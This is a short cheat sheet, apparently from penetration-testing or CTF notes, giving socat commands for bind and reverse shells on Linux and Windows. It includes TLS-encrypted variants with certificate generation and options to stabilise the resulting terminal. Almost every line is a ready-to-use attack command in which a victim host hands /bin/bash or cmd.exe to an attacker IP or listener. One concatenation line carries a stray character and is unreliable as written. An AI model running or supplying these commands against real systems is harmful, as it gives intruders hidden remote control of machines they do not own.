# Socat-Cheatsheet
Linux Bind:
socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash

Windows Bind:
TCP4-LISTEN:4444 EXEC:'cmd.exe',pipes

Connect from Attacker:
socat - TCP4:10.10.10.1:4444

Reverse Shell:
(attacker) socat -d -d TCP4-LISTEN:4444 STDOUT
(linux victim) socat TCP4:10.10.10.1:4444 EXEC:/bin/bash
(windows victim) socat TCP4:10.10.10.1:4444 EXEC:'cmd.exe',pipes


Socat TLS Bind Shell: (pem on victim side)
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
cat bind.key bind.crt L > bind.pem
(linux victim) socat OPENSSL-LISTEN:4444,cert=bind.pem,verify=0,fork EXEC:/bin/bash
(attacker)socat - OPENSSL:10.10.10.1:4444,verify=0
(windows victim) socat OPENSSL-LISTEN:4444,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes

Socat TLS Reverse Shell: (pem on attacker side)
(attacker) socat -d -d OPENSSL-LISTEN:4444,cert=bind.pem,verify=0,fork STDOUT
(linux victim) socat OPENSSL:10.10.10.1:4444,verify=0 EXEC:/bin/bash
(windows victim) socat OPENSSL:10.10.10.1:4444,verify=0 EXEC:'cmd.exe',pipes

Socat Linux Stability switches:
pty - allocates a pseudoterminal on the target -- part of the stabilisation process
stderr - makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint - passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid - creates the process in a new session
sane - stabilises the terminal, attempting to "normalise" it.

Example of above:
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

